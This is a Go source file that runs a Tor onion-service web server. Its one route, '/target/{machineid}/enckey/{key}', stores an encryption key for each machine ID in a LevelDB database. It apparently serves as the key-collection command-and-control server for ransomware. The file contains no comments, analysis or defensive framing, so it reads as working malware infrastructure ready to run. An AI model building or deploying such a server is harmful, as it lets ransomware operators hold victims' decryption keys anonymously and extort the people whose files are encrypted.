package main

import (
    "log"
    "net/http"
    "context"
    "time"
    "github.com/gorilla/mux"
    "github.com/syndtr/goleveldb/leveldb"
    "github.com/cretz/bine/tor"
)

const (
    db_filepath = "TEMP"
)

func main() {
    db, err := leveldb.OpenFile(db_filepath, nil)
    if err != nil {
        log.Fatalln(err)
    }
    defer db.Close()

    r := mux.NewRouter()
    r.HandleFunc("/target/{machineid}/enckey/{key}", func(w http.ResponseWriter, r *http.Request) {
        params := mux.Vars(r)
        machineid := params["machineid"]
        key := params["key"]
        if data, err := db.Get([]byte(machineid), nil); err != nil {
            db.Put([]byte(machineid), []byte(key), nil)
        } else {
            log.Printf("key already exists: %s\n", data)
            return
        }
    }).Methods("GET")

    t, err := tor.Start(nil, nil)
    if err != nil {
        log.Fatal(err)
    }
    defer t.Close()

    ctx, cancel := context.WithTimeout(context.Background(), 3 * time.Minute)
    defer cancel()

    onion, err := t.Listen(ctx, &tor.ListenConf{RemotePorts: []int{80}})
    if err != nil {
        log.Fatalln(err)
    }
    defer onion.Close()

    log.Printf("onion url: http://%v\n", onion.ID)

    http.Serve(onion, r)
}
